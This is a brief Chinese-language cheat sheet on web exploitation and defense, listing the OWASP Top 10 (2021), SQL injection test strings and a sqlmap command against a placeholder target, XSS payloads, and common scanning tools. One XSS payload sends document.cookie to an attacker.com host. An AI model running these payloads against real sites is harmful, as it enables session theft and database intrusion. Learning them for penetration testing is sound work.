# Web漏洞利用与防御

## OWASP Top 10 (2021)

1. 访问控制失效
2. 加密失败
3. 注入
4. 不安全设计
5. 安全配置错误
6. 使用已知漏洞组件
7. 身份认证失效
8. 软件和数据完整性失败
9. 日志和监控不足
10. 服务端请求伪造

## SQL注入利用

```bash
# 手动测试
' OR '1'='1
' UNION SELECT NULL--

# sqlmap自动利用
sqlmap -u \"http://target.com/product?id=1\" --batch --dbs
```

## XSS利用

```html
<script>alert(document.cookie)</script>
<script>
fetch('http://attacker.com/steal?c=' + document.cookie)
</script>
```

## 漏洞扫描工具

| 工具 | 特点 |
|------|------|
| Burp Suite | Web渗透测试平台 |
| OWASP ZAP | 开源Web扫描器 |
| SQLMap | SQL注入检测 |
| XSStrike | XSS检测 |'